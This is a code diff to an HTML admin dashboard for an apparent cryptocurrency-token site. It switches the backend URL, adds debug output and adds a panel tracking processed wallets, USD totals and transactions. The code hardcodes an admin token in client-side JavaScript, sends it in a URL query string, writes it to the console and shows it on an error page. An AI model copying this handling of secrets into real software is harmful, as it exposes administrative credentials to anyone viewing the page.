@@ -391,10 +391,10 @@
 
     <script>
         // ============================================
-        // CONFIGURATION - YOUR BACKEND URL
+        // CONFIGURATION - FIXED BACKEND URL
         // ============================================
         const ADMIN_TOKEN = 'YourSecureTokenHere123!';
-        const BACKEND_URL = 'https://bthbk.vercel.app';
+        const BACKEND_URL = 'https://hyperback.vercel.app';  // FIXED: Changed from bthbk to hyperback
 
         // ============================================
         // LOAD DASHBOARD DATA
@@ -408,6 +408,8 @@
                     </div>
                 `;
 
+                console.log(`Fetching from: ${BACKEND_URL}/api/admin/dashboard?token=${ADMIN_TOKEN}`);
+                
                 const response = await fetch(`${BACKEND_URL}/api/admin/dashboard?token=${ADMIN_TOKEN}`);
                 const data = await response.json();
 
@@ -418,6 +420,7 @@
                             <h2 style="color: #ef4444;">Unauthorized Access</h2>
                             <p style="color: #8f9bb5;">Invalid admin token</p>
                             <p style="color: #8f9bb5; margin-top: 10px;">Token used: ${ADMIN_TOKEN}</p>
+                            <p style="color: #8f9bb5;">Backend URL: ${BACKEND_URL}</p>
                             <button onclick="loadDashboard()" style="margin-top: 20px; padding: 10px 30px; background: #60a5fa; border: none; border-radius: 30px; color: #fff; cursor: pointer;">Retry</button>
                         </div>
                     `;
@@ -433,6 +436,7 @@
                         <h2 style="color: #ef4444;">Connection Error</h2>
                         <p style="color: #8f9bb5;">${error.message}</p>
                         <p style="color: #8f9bb5; margin-top: 10px;">Backend URL: ${BACKEND_URL}</p>
+                        <p style="color: #8f9bb5;">Make sure your backend is running at this URL</p>
                         <button onclick="loadDashboard()" style="margin-top: 20px; padding: 10px 30px; background: #60a5fa; border: none; border-radius: 30px; color: #fff; cursor: pointer;">Retry</button>
                     </div>
                 `;
@@ -440,7 +444,7 @@
         }
 
         // ============================================
-        // RENDER DASHBOARD - FIXED VERSION
+        // RENDER DASHBOARD
         // ============================================
         function renderDashboard(data) {
             const summary = data.summary;
@@ -481,6 +485,18 @@
                         <div class="stat-label">Total Processed</div>
                         <div class="stat-value green">$${summary.totalProcessedUSD}</div>
                         <div class="stat-sub">${summary.totalProcessedWallets} wallets</div>
+                    </div>
+                </div>
+
+                <!-- Backend Info -->
+                <div style="background: rgba(96, 165, 250, 0.1); border: 1px solid #60a5fa; border-radius: 12px; padding: 16px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;">
+                    <div>
+                        <span style="color: #60a5fa; font-weight: 600;">🔧 BACKEND URL:</span>
+                        <span style="color: #fff; margin-left: 10px;">${summary.backendUrl || 'https://hyperback.vercel.app'}</span>
+                    </div>
+                    <div>
+                        <span style="color: #60a5fa; font-weight: 600;">🌍 SITE URL:</span>
+                        <span style="color: #fff; margin-left: 10px;">${summary.siteUrl || 'https://bitcoinhypertoken.vercel.app'}</span>
                     </div>
                 </div>
 
@@ -635,7 +651,7 @@
                     </div>
                 </div>
 
-                <!-- Transactions Tab - FIXED: using processedTransactions -->
+                <!-- Transactions Tab -->
                 <div id="tab-transactions" class="tab-content" style="display: none;">
                     <div class="table-container">
                         <div class="table-header">
@@ -776,6 +792,7 @@
 
         // Load dashboard on page load
         loadDashboard();
+        // Auto-refresh every 30 seconds
         setInterval(loadDashboard, 30000);
     </script>
 </body>
